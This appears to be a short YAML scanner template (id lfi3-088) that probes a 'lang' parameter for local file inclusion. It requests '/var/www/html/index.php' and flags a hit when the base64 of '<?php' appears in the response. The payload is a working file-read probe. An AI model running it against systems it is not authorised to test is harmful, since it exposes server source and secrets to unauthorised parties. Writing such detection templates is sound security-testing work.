id: lfi3-088
name: 'Traversal to system file via lang'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via lang'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      lang:
        - '/var/www/html/index.php'
    matchers:
      - type: word
        part: body
        words:
          - 'PD9waHA'
